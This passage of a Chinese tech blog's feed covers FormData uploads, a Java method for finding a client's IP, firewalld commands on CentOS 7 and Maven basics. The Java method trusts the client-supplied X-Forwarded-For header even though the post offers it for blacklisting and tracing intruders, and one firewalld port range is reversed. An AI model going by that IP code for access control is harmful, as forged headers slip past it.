class="line">request.send(formData);</span><br></pre></td></tr></table></figure><p>这样你就可以在发送请求之前自由地附加不一定是用户编辑的字段到表单数据里</p><h2 id="使用FormData对象上传文件"><a href="#使用FormData对象上传文件" class="headerlink" title="使用FormData对象上传文件"></a>使用FormData对象上传文件</h2><p>你还可以使用FormData上传文件。使用的时候需要在表单中添加一个文件类型的input：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">name</span>=<span class="string">"fileinfo"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">label</span>&gt;</span>Your email address:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"email"</span> <span class="attr">autocomplete</span>=<span class="string">"on"</span> <span class="attr">autofocus</span> <span class="attr">name</span>=<span class="string">"userid"</span> <span class="attr">placeholder</span>=<span class="string">"email"</span> <span class="attr">required</span> <span class="attr">size</span>=<span class="string">"32"</span> <span class="attr">maxlength</span>=<span class="string">"64"</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">label</span>&gt;</span>Custom file label:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"filelabel"</span> <span class="attr">size</span>=<span class="string">"12"</span> <span class="attr">maxlength</span>=<span class="string">"32"</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">label</span>&gt;</span>File to stash:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"file"</span> <span class="attr">required</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Stash the file!"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>然后使用下面的代码发送请求：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> form = <span class="built_in">document</span>.forms.namedItem(<span class="string">"fileinfo"</span>);</span><br><span class="line">form.addEventListener(<span class="string">'submit'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">ev</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> oOutput = <span class="built_in">document</span>.querySelector(<span class="string">"div"</span>),</span><br><span class="line">      oData = <span class="keyword">new</span> FormData(form);</span><br><span class="line"></span><br><span class="line">  oData.append(<span class="string">"CustomField"</span>, <span class="string">"This is some extra data"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> oReq = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">  oReq.open(<span class="string">"POST"</span>, <span class="string">"stash.php"</span>, <span class="literal">true</span>);</span><br><span class="line">  oReq.onload = <span class="function"><span class="keyword">function</span>(<span class="params">oEvent</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (oReq.status == <span class="number">200</span>) &#123;</span><br><span class="line">      oOutput.innerHTML = <span class="string">"Uploaded!"</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      oOutput.innerHTML = <span class="string">"Error "</span> + oReq.status + <span class="string">" occurred when trying to upload your file.&lt;br \/&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  oReq.send(oData);</span><br><span class="line">  ev.preventDefault();</span><br><span class="line">&#125;, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure><p><font color="red">注意</font>：如果FormData对象是通过表单创建的，则表单中指定的请求方式会被应用到方法open()中 。</p><p>你还可以直接向FormData对象附加File或Blob类型的文件，如下所示：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data.append(<span class="string">"myfile"</span>, myBlob, <span class="string">"filename.txt"</span>);</span><br></pre></td></tr></table></figure><p>使用append()方法时，可以通过第三个可选参数设置发送请求的头 Content-Disposition 指定文件名。如果不指定文件名（或者不支持该参数时），将使用名字“blob”。</p><p>如果你设置正确的配置项，你也可以通过jQuery来使用FormData对象：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> fd = <span class="keyword">new</span> FormData(<span class="built_in">document</span>.querySelector(<span class="string">"form"</span>));</span><br><span class="line">fd.append(<span class="string">"CustomField"</span>, <span class="string">"This is some extra data"</span>);</span><br><span class="line">$.ajax(&#123;</span><br><span class="line">  url: <span class="string">"stash.php"</span>,</span><br><span class="line">  type: <span class="string">"POST"</span>,</span><br><span class="line">  data: fd,</span><br><span class="line">  processData: <span class="literal">false</span>,  <span class="comment">// 不处理数据</span></span><br><span class="line">  contentType: <span class="literal">false</span>   <span class="comment">// 不设置内容类型</span></span><br></pre></td></tr></table></figure><p>通过AJAX提交表单和上传文件可以不使用FormData对象<br>如果你想知道不使用FormData对象的情况下，通过AJAX序列化和提交表单 请点击<a href="https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/Using_XMLHttpRequest#Submitting_forms_and_uploading_files" target="_blank" rel="noopener">这里</a>。</p><h3 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h3><ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/Using_XMLHttpRequest" target="_blank" rel="noopener">Using XMLHttpRequest</a></li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/HTMLFormElement" target="_blank" rel="noopener">HTMLFormElement</a></li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Blob" target="_blank" rel="noopener">Blob</a></li><li><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Typed_arrays" target="_blank" rel="noopener">Typed Arrays</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;通过FormData对象可以组装一组用 XMLHttpRequest发送请求的键/值对。
    
    </summary>
    
      <category term="JavaScript" scheme="https://aunsetre.top/categories/JavaScript/"/>
    
    
      <category term="AJAX" scheme="https://aunsetre.top/tags/AJAX/"/>
    
      <category term="FormData" scheme="https://aunsetre.top/tags/FormData/"/>
    
      <category term="Forms" scheme="https://aunsetre.top/tags/Forms/"/>
    
      <category term="XMLHttpRequest" scheme="https://aunsetre.top/tags/XMLHttpRequest/"/>
    
  </entry>
  
  <entry>
    <title>Java获取客户端真实IP</title>
    <link href="https://aunsetre.top/2018/05/05/javaweb%E8%8E%B7%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E7%9C%9F%E5%AE%9Eip/"/>
    <id>https://aunsetre.top/2018/05/05/javaweb获取客户端真实ip/</id>
    <published>2018-05-04T16:00:00.000Z</published>
    <updated>2018-06-11T03:58:22.380Z</updated>
    
    <content type="html"><![CDATA[<p>在安全性要求较高的web项目中，我们经常有这样的需求:</p><ul><li>黑名单：禁止指定ip访问。</li><li>白名单：允许指定ip访问。</li><li>根据ip追踪恶意入侵系统者。</li></ul><p>在Java中我们通常可以这样获取客户端ip地址：<a id="more"></a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">request.getRemoteAddr();</span><br></pre></td></tr></table></figure><p>但是这个方法有个弊端，就是如果对方使用了反向代理，那么这个方法获取到的永远都是反向代理服务器的ip，而并非用户的真实ip。这样也能达到禁止访问的目的，但是对于已经发生的恶意入侵，我们却无法定位到真实的用户主机。</p><p>当你遇到类似的问题时，那么下面的代码就能够很好的帮助你。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">getClientIP</span><span class="params">(HttpServletRequest request)</span> </span>&#123;</span><br><span class="line">String ip = request.getHeader(<span class="string">"X-Forwarded-For"</span>);</span><br><span class="line"><span class="keyword">if</span> (StringUtils.isNotEmpty(ip) &amp;&amp; !<span class="string">"unKnown"</span>.equalsIgnoreCase(ip)) &#123;</span><br><span class="line">    <span class="comment">// 多次反向代理后会有多个ip值，第一个ip才是真实ip</span></span><br><span class="line">    <span class="keyword">int</span> index = ip.indexOf(<span class="string">","</span>);</span><br><span class="line">    <span class="keyword">if</span> (index != -<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> ip.substring(<span class="number">0</span>, index);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> ip;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">ip = request.getHeader(<span class="string">"X-Real-IP"</span>);</span><br><span class="line"><span class="keyword">if</span> (StringUtils.isNotEmpty(ip) &amp;&amp; !<span class="string">"unKnown"</span>.equalsIgnoreCase(ip)) &#123;</span><br><span class="line">    <span class="keyword">return</span> ip;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> request.getRemoteAddr();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在安全性要求较高的web项目中，我们经常有这样的需求:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;黑名单：禁止指定ip访问。&lt;/li&gt;
&lt;li&gt;白名单：允许指定ip访问。&lt;/li&gt;
&lt;li&gt;根据ip追踪恶意入侵系统者。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;在Java中我们通常可以这样获取客户端ip地址：
    
    </summary>
    
      <category term="Java" scheme="https://aunsetre.top/categories/Java/"/>
    
    
  </entry>
  
  <entry>
    <title>Linux进程管理相关命令详述</title>
    <link href="https://aunsetre.top/2018/05/01/centos/"/>
    <id>https://aunsetre.top/2018/05/01/centos/</id>
    <published>2018-04-30T16:00:00.000Z</published>
    <updated>2018-05-26T11:34:03.567Z</updated>
    
    <content type="html"><![CDATA[<p>在 CentOS 7 中，引入了一个新的服务，Firewalld<a id="more"></a>，下面一张图，让大家明确的了解防火墙 Firewall 与 iptables 之间的关系与区别。</p><p><img src="https://static.aunsetre.top/hexo/img/vev7u6217iiltoelprv656ro9n.png" alt="alt"></p><p>安装它，只需</p><pre><code>yum install firewalld</code></pre><p>如果需要图形界面的话，则再安装</p><pre><code>yum install firewall-config</code></pre><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>防火墙守护 firewalld 服务引入了一个信任级别的概念来管理与之相关联的连接与接口。它支持 ipv4 与 ipv6，并支持网桥，采用 firewall-cmd (command) 或 firewall-config (gui) 来动态的管理 kernel netfilter 的临时或永久的接口规则，并实时生效而无需重启服务。</p><h2 id="zone"><a href="#zone" class="headerlink" title="zone"></a>zone</h2><ul><li>drop: 丢弃所有进入的包，而不给出任何响应</li><li>block: 拒绝所有外部发起的连接，允许内部发起的连接</li><li>public: 允许指定的进入连接</li><li>external: 同上，对伪装的进入连接，一般用于路由转发</li><li>dmz: 允许受限制的进入连接</li><li>work: 允许受信任的计算机被限制的进入连接，类似 workgroup</li><li>home: 同上，类似 homegroup</li><li>internal: 同上，范围针对所有互联网用户</li><li>trusted: 信任所有连接</li></ul><h2 id="过滤规则"><a href="#过滤规则" class="headerlink" title="过滤规则"></a>过滤规则</h2><ul><li>source: 根据源地址过滤</li><li>interface: 根据网卡过滤</li><li>service: 根据服务名过滤</li><li>port: 根据端口过滤</li><li>icmp-block: icmp 报文过滤，按照 icmp 类型配置</li><li>masquerade: ip 地址伪装</li><li>forward-port: 端口转发</li><li>rule: 自定义规则</li></ul><p>其中，过滤规则的优先级遵循如下顺序</p><p>1.source<br>2.interface<br>3.firewalld.conf</p><h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><pre><code>systemctl start firewalld        # 启动,systemctl enable firewalld        # 开机启动systemctl stop firewalld          # 关闭systemctl disable firewalld      # 取消开机启动</code></pre><p>具体的规则管理，可以使用firewall-cmd ，具体的使用方法可以</p><pre><code>$ firewall-cmd --helpzone=NAME                        # 指定 zonepermanent                        # 永久修改，--reload 后生效timeout=seconds                  # 持续效果，到期后自动移除，用于调试，不能与 --permanent 同时使用</code></pre><h2 id="查看规则"><a href="#查看规则" class="headerlink" title="查看规则"></a>查看规则</h2><p>查看运行状态</p><pre><code>$ firewall-cmd --state</code></pre><p>查看已被激活的 Zone 信息</p><pre><code>$ firewall-cmd --get-active-zonespublic  interfaces: eth0 eth1</code></pre><p>查看指定接口的 Zone 信息</p><pre><code>$ firewall-cmd --get-zone-of-interface=eth0public</code></pre><p>查看指定级别的接口</p><pre><code>$ firewall-cmd --zone=public --list-interfaceseth0</code></pre><p>查看指定级别的所有信息，譬如 public</p><pre><code>$ firewall-cmd --zone=public --list-allpublic (default, active)  interfaces: eth0  sources:  services: dhcpv6-client http ssh  ports:  masquerade: no  forward-ports:  icmp-blocks:  rich rules:</code></pre><p>查看所有级别被允许的信息</p><pre><code>$ firewall-cmd --get-service</code></pre><p>查看重启后所有 Zones 级别中被允许的服务，即永久放行的服务</p><pre><code>$ firewall-cmd --get-service --permanent</code></pre><h2 id="管理规则"><a href="#管理规则" class="headerlink" title="管理规则"></a>管理规则</h2><pre><code>firewall-cmd --panic-on          # 丢弃firewall-cmd --panic-off          # 取消丢弃firewall-cmd --query-panic        # 查看丢弃状态firewall-cmd --reload            # 更新规则，不重启服务firewall-cmd --complete-reload    # 更新规则，重启服务</code></pre><p>添加某接口至某信任等级，譬如添加 eth0 至 public，永久修改</p><pre><code>firewall-cmd --zone=public --add-interface=eth0 --permanent</code></pre><p>设置 public 为默认的信任级别</p><pre><code>firewall-cmd --set-default-zone=public</code></pre><p>管理端口</p><p>列出 dmz 级别的被允许的进入端口</p><pre><code>firewall-cmd --zone=dmz --list-ports</code></pre><p>允许 tcp 端口 8080 至 dmz 级别</p><pre><code>firewall-cmd --zone=dmz --add-port=8080/tcp</code></pre><p>允许某范围的 udp 端口至 public 级别，并永久生效</p><pre><code>firewall-cmd --zone=public --add-port=5060-5059/udp --permanent</code></pre><p>网卡接口</p><p>列出 public zone 所有网卡</p><pre><code>firewall-cmd --zone=public --list-interfaces</code></pre><p>将 eth0 添加至 public zone，永久</p><pre><code>firewall-cmd --zone=public --permanent --add-interface=eth0</code></pre><p>eth0 存在与 public zone，将该网卡添加至 work zone，并将之从 public zone 中删除</p><pre><code>firewall-cmd --zone=work --permanent --change-interface=eth0</code></pre><p>删除 public zone 中的 eth0，永久</p><pre><code>firewall-cmd --zone=public --permanent --remove-interface=eth0</code></pre><p>管理服务</p><p>添加 smtp 服务至 work zone</p><pre><code>firewall-cmd --zone=work --add-service=smtp</code></pre><p>移除 work zone 中的 smtp 服务</p><pre><code>firewall-cmd --zone=work --remove-service=smtp</code></pre><p>配置 external zone 中的 ip 地址伪装</p><p>查看</p><pre><code>firewall-cmd --zone=external --query-masquerade</code></pre><p>打开伪装</p><pre><code>firewall-cmd --zone=external --add-masquerade</code></pre><p>关闭伪装</p><pre><code>firewall-cmd --zone=external --remove-masquerade</code></pre><p>配置 public zone 的端口转发</p><p>要打开端口转发，则需要先</p><pre><code>firewall-cmd --zone=public --add-masquerade</code></pre><p>然后转发 tcp 22 端口至 3753</p><pre><code>firewall-cmd --zone=public --add-forward-port=port=22:proto=tcp:toport=3753</code></pre><p>转发 22 端口数据至另一个 ip 的相同端口上</p><pre><code>firewall-cmd --zone=public --add-forward-port=port=22:proto=tcp:toaddr=192.168.1.100</code></pre><p>转发 22 端口数据至另一 ip 的 2055 端口上</p><pre><code>firewall-cmd --zone=public --add-forward-port=port=22:proto=tcp:toport=2055:toaddr=192.168.1.100</code></pre><p>配置 public zone 的 icmp</p><p>查看所有支持的 icmp 类型</p><pre><code>firewall-cmd --get-icmptypesdestination-unreachable echo-reply echo-request parameter-problem redirect router-advertisement router-solicitation source-quench time-exceeded</code></pre><p>列出</p><pre><code>firewall-cmd --zone=public --list-icmp-blocks</code></pre><p>添加 echo-request 屏蔽</p><pre><code>firewall-cmd --zone=public --add-icmp-block=echo-request [--timeout=seconds]</code></pre><p>移除 echo-reply 屏蔽</p><pre><code>firewall-cmd --zone=public --remove-icmp-block=echo-reply</code></pre><p>IP 封禁</p><pre><code>firewall-cmd --permanent --add-rich-rule=&quot;rule family=&apos;ipv4&apos; source address=&apos;222.222.222.222&apos; reject&quot;</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在 CentOS 7 中，引入了一个新的服务，Firewalld
    
    </summary>
    
      <category term="Linux" scheme="https://aunsetre.top/categories/Linux/"/>
    
    
      <category term="CentOS" scheme="https://aunsetre.top/tags/CentOS/"/>
    
      <category term="Linux" scheme="https://aunsetre.top/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>Maven知识点整理</title>
    <link href="https://aunsetre.top/2018/04/10/Maven%E7%9F%A5%E8%AF%86%E7%82%B9%E6%95%B4%E7%90%86/"/>
    <id>https://aunsetre.top/2018/04/10/Maven知识点整理/</id>
    <published>2018-04-09T16:00:00.000Z</published>
    <updated>2018-06-11T02:00:14.364Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-maven常用构建命令-了解"><a href="#1-maven常用构建命令-了解" class="headerlink" title="1.maven常用构建命令(了解)"></a>1.maven常用构建命令(了解)</h2><ul><li><code>mvn -v</code>:查看maven的版本。</li><li><code>mvn compile</code>:编译项目。项目经过编译后会在根目录下生成一个target包(跟src包在同一目录下)，里面保存的是编译项目时字节码文件和测试报告。</li><li><code>mvn test</code>:测试。此命令在项目目录下</li><li><code>mvn package</code>:打包我们的项目。</li><li><code>mvn clean</code>:删除上述经过编译后生成的target包。</li><li><code>mvn install</code>:将我们的项目打包到本地仓库中。例如将A项目用该命令打包到本地仓库后，就可以在B项目的pom.xml文件中配置A项目的坐标来让B项目引用A项目，见下文仓库的讲解。</li></ul><p>只有第一个命令<code>mvn -v</code>是在根目录下执行，其他5个命令都是在我们的maven项目包下执行的。</p><p>上述知识只做了解，在实际开发中基本没有用到上述命令。</p><a id="more"></a><h2 id="2-maven自动构件骨架"><a href="#2-maven自动构件骨架" class="headerlink" title="2.maven自动构件骨架"></a>2.maven自动构件骨架</h2><p>我在<a href="http://codingxiaxw.cn/2016/11/24/51-first-maven-project/" target="_blank" rel="noopener">创建第一个Maven项目</a>中就有介绍过，让maven自动为我们的项目生成一个标准的骨架有两种方式，一种是通过命令行输入:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mvn archetype:generate -DgroupId=cn.codingxiaxw.helloword -DartifactId=helloworld -Dpackage=cn.codingxiaxw.helloword -Dversion=1.0-SNAPSHOT -DarchetypeArtifactId=maven-archetype-quickstart</span><br></pre></td></tr></table></figure><p>或者:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mvn archetype:generate -DgroupId=cn.codingxiaxw.helloword -DartifactId=helloworld -Dpackage=cn.codingxiaxw.helloword -Dversion=1.0-SNAPSHOT -DarchetypeArtifactId=maven-archetype-webapp</span><br></pre></td></tr></table></figure><p>第二种方式是使用IDEA开发工具为我们生成，步骤之前讲过，大家可以点击上述链接看我在那篇文章中的介绍。这里只对上述命令进行解释，如下:</p><ul><li><code>mvn</code>:表示使用的是maven命令。</li><li><code>archetype:generate</code>:表示使用generate这个插件为我们的maven项目自动生成一个maven骨架，即我们项目的工程结构(如下图)。后边跟的是该插件为我们创建工程结构所需要的一连串的参数。</li><li><code>-DgroupId</code>:标识项目的坐标元素之一，与DartifactId,Dpackaging,Dversion组成我们maven项目的坐标，四者唯一确定一个项目。它的值为我们的项目包名，我这里的格式用的我的博客网站后缀+我的用户名+项目名组成。</li><li><code>-DartifactId</code>:标识项目的坐标元素之一，它的值为我们的项目名。我这里指定我要生成的项目名为helloword。</li><li><code>-Dpackage</code>:标识项目的坐标元素之一,这里值就跟DgroupId的值保持一致即可。此属性在命令行中可选。</li><li><code>-Dversion</code>:指定版本号。此属性在命令行中可选</li><li><code>-DarchetypeArtifactId</code>:表示我们生成的工程结构为哪一种，这里的属性值为<code>maven-archetype-quickstart</code>表示生成工程目录结构为quickstart的结构。其值还可以为<code>maven-archetype-webapp</code>表示生成的工程目录结构为webapp型的结构。</li></ul><h2 id="3-maven中的坐标和仓库"><a href="#3-maven中的坐标和仓库" class="headerlink" title="3.maven中的坐标和仓库"></a>3.maven中的坐标和仓库</h2><h3 id="3-1坐标"><a href="#3-1坐标" class="headerlink" title="3.1坐标"></a>3.1坐标</h3><p>在maven的世界中，maven以构件来组成基本的控制单元，而定义这个构件的标示，maven给定义为“坐标”。坐标是maven最基本的概念，它就像每个构件的身份证号码，有了它我们就可以在数以千万计的构件中定位任何一个我们感兴趣的构件。</p><p>例如我们在上篇文章中通过maven命令生成的maven项目中，其pom.xml中有这样一些配置:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;groupId&gt;cn.codingxiaxw.helloword&lt;/groupId&gt;</span><br><span class="line">&lt;artifactId&gt;helloword&lt;/artifactId&gt;</span><br><span class="line">&lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;</span><br><span class="line">&lt;packaging&gt;jar&lt;/packaging&gt;</span><br></pre></td></tr></table></figure><p>上面这样四个xml元素即即组成了一个坐标，唯一标识我们创建的这个项目。</p><p>再如若我们要在自己的项目中引入junit测试jar包，只需在pom.xml中配置如下junit的坐标:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;  </span><br><span class="line">  &lt;groupId&gt;junit&lt;/groupId&gt;  </span><br><span class="line">  &lt;artifactId&gt;junit&lt;/artifactId&gt;  </span><br><span class="line">  &lt;version&gt;4.8.2&lt;/version&gt;  </span><br><span class="line">  &lt;scope&gt;test&lt;/scope&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><p>maven就会根据我们给出的junit的坐标在其中央仓库中为我们找到junit 的相关jar包，然后将其下载到自己的本地仓库中。这样我们便可以在自己的项目开发中运用junit类进行测试了。</p><h3 id="3-2仓库"><a href="#3-2仓库" class="headerlink" title="3.2仓库"></a>3.2仓库</h3><p>上述我们已经提到了仓库，其实当我们在自己的电脑上成功安装maven后，就已经已经生成了一个本地仓库，可以在下列地址中找到:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/Users/codingBoy/.m2/repository</span><br></pre></td></tr></table></figure><p>打开后发现里面全是各种本地仓库中的各种引用开发jar包，这里也能发现我们在pom.xml中配置的junit，可以发现已经下载到本地仓库里面了，如下:</p><p><a href="http://od2xrf8gr.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202016-11-26%20%E4%B8%8B%E5%8D%8811.14.38.png" target="_blank" rel="noopener"><img src="http://od2xrf8gr.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202016-11-26%20%E4%B8%8B%E5%8D%8811.14.38.png" alt="img"></a></p><p>只要我们在pom.xml中配置了相关jar包的坐标，maven都会根据这个坐标自动将这些jar包下载在该目录(也就是maven的本地仓库)下供我们开发过程中的直接引用。</p><p>既然有本地仓库，那么是不是还有个远程仓库的概念呢？答案是肯定的，这个远程仓库是个大仓库，叫做中央仓库，地址为:<code>https://repo.maven.apache.org/maven2</code>。感谢开源社区的贡献，在maven的中央仓库里几乎为我们下载了所有开发都需要的jar包，如下:</p><p><a href="http://od2xrf8gr.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202016-11-26%20%E4%B8%8B%E5%8D%8811.31.10.png" target="_blank" rel="noopener"><img src="http://od2xrf8gr.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202016-11-26%20%E4%B8%8B%E5%8D%8811.31.10.png" alt="img"></a></p><p>要是此时我们又创建了一个maven项目helloword2，而且需要在这个项目中引用helloword项目，只要将helloword项目打包到本地仓库，然后在helloword2项目的pom.xml文件中引入helloword的坐标即可。通过如下步骤:</p><p>1.在命令行中输入命令:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">先cd helloword</span><br><span class="line"></span><br><span class="line">然后mvn clean</span><br></pre></td></tr></table></figure><p>通过上述步骤清除helloword经过编译后生成的target包。</p><p>2.输入:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mvn install</span><br></pre></td></tr></table></figure><p>将helloword项目打包并发布到本地仓库中。</p><p>3.此时helloword2就可以根据坐标来引入helloword项目了，在helloword2的pom.xml文件中添加helloword的坐标:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">  &lt;groupId&gt;cn.codingxiaxw.helloword&lt;/groupId&gt;</span><br><span class="line">  &lt;artifactId&gt;helloword&lt;/artifactId&gt;</span><br><span class="line">  &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;</span><br><span class="line">  &lt;packaging&gt;jar&lt;/packaging&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><p>这样便完成了在一个项目中对另一个项目进行引用。</p><h3 id="3-3坐标和仓库的关系"><a href="#3-3坐标和仓库的关系" class="headerlink" title="3.3坐标和仓库的关系"></a>3.3坐标和仓库的关系</h3><p>有了坐标，就知道在什么位置存储构件的内容，中央仓库也是一个样，上述例子中引用的junit的可以把它的坐标描述为：junit:junit:4.8.2，在中央仓库地址中打开对应的目录果然看到了Junit的jar包:</p><p><a href="http://od2xrf8gr.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202016-11-26%20%E4%B8%8B%E5%8D%8811.39.56.png" target="_blank" rel="noopener"><img src="http://od2xrf8gr.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202016-11-26%20%E4%B8%8B%E5%8D%8811.39.56.png" alt="img"></a></p><p>有了正确的坐标,Maven才能够在正确的位置找到依赖文件并使用，上述pom.xml中为junit坐标设置的<code>&lt;scope&gt;</code>标签中的test值是用来控制该依赖只在测试时可用，与坐标无关。</p><p>正因为坐标是Maven核心的核心，因此规划正确的坐标至关重要，如果你使用了模糊不清的坐标，那么你的用户就很难找到你的构件，或者即使找到了，也容易写错。错误的使用坐标，还会造成冲突，如果你也使用junit这样的groupId，那就悲剧了。</p><h2 id="4-生命周期和插件"><a href="#4-生命周期和插件" class="headerlink" title="4.生命周期和插件"></a>4.生命周期和插件</h2><p>Maven定义了三套生命周期：clean、default、site，每个生命周期都包含了一些阶段（phase）。三套生命周期相互独立，但各个生命 周期中的phase却是有顺序的，且后面的phase依赖于前面的phase。执行某个phase时，其前面的phase会依顺序执行，但不会触发另外两 套生命周期中的任何phase。</p><ul><li>clean，做些清理的工作。</li><li>default，最核心的周期，做初始化和构建的工作，里面分的阶段很多，主要是compllie,test, package, 